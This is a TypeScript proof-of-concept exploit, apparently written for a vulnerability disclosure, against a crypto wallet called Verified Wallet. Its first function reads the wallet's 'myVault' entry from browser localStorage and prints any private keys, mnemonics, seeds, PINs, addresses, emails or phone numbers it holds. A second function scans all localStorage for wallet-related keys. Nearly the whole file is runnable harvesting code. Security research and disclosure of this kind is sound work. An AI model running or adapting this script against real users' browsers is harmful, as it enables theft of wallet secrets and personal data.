/**
 * PoC #1: localStorage Vault Data Leak
 * 
 * Vulnerability: The Verified Wallet stores vault data in localStorage which
 * is accessible to any JavaScript running on the same origin.
 * 
 * Impact: A malicious dApp could read wallet addresses, chain IDs, and 
 * potentially other sensitive data from localStorage.
 * 
 * Severity: HIGH (CVSS 7.0-8.9)
 * 
 * This script simulates a malicious dApp attempting to extract vault data.
 */

// This can be run in browser console on any page where Verified Wallet is active

function exploitLocalStorageLeak(): void {
  console.log("🔓 PoC: Attempting to read Verified Wallet vault from localStorage...\n");
  
  const vaultKey = "myVault";
  const vaultData = localStorage.getItem(vaultKey);
  
  if (!vaultData) {
    console.log("❌ No vault data found. User may not have connected their wallet on this page.");
    return;
  }
  
  try {
    const parsed = JSON.parse(vaultData);
    
    console.log("✅ SUCCESS: Vault data extracted from localStorage!\n");
    console.log("=" .repeat(60));
    
    // Check for critical fields
    const criticalFields = ["privateKey", "pk", "mnemonic", "seed", "secret"];
    const highFields = ["address", "regAddress", "hashedVaultId", "pin", "hashedPin"];
    const mediumFields = ["chainId", "email", "phone"];
    
    console.log("🔴 CRITICAL FIELDS CHECK:");
    for (const field of criticalFields) {
      if (parsed[field]) {
        console.log(`   💀 ${field}: EXPOSED!`);
        console.log(`      Value: ${String(parsed[field]).substring(0, 20)}...`);
      }
    }
    
    console.log("\n🟠 HIGH RISK FIELDS:");
    for (const field of highFields) {
      if (parsed[field]) {
        console.log(`   ⚠️  ${field}: ${parsed[field]}`);
      }
    }
    
    console.log("\n🟡 MEDIUM RISK FIELDS:");
    for (const field of mediumFields) {
      if (parsed[field]) {
        console.log(`   📋 ${field}: ${parsed[field]}`);
      }
    }
    
    console.log("\n📊 FULL VAULT STRUCTURE:");
    console.log(JSON.stringify(parsed, null, 2));
    
    console.log("\n" + "=".repeat(60));
    console.log("IMPACT: Attacker can now:");
    console.log("  1. Know all wallet addresses associated with this user");
    console.log("  2. Track user across multiple dApps");
    console.log("  3. Potentially replay or spoof wallet requests");
    
    return parsed;
    
  } catch (e) {
    console.log("⚠️  Vault data exists but failed to parse:", e);
    console.log("Raw data:", vaultData);
  }
}

// Additional reconnaissance function
function scanAllWalletStorage(): void {
  console.log("\n🔍 Scanning ALL localStorage for wallet-related data...\n");
  
  const walletKeywords = [
    "vault", "wallet", "private", "key", "mnemonic", "seed", 
    "account", "address", "eth", "verified", "custody"
  ];
  
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    if (!key) continue;
    
    const keyLower = key.toLowerCase();
    for (const keyword of walletKeywords) {
      if (keyLower.includes(keyword)) {
        console.log(`🎯 Found key: "${key}"`);
        try {
          const value = localStorage.getItem(key);
          if (value) {
            const preview = value.length > 100 ? value.substring(0, 100) + "..." : value;
            console.log(`   Value preview: ${preview}`);
          }
        } catch {
          console.log("   (Could not read value)");
        }
        break;
      }
    }
  }
}

// Run the exploit
exploitLocalStorageLeak();
scanAllWalletStorage();

export { exploitLocalStorageLeak, scanAllWalletStorage };
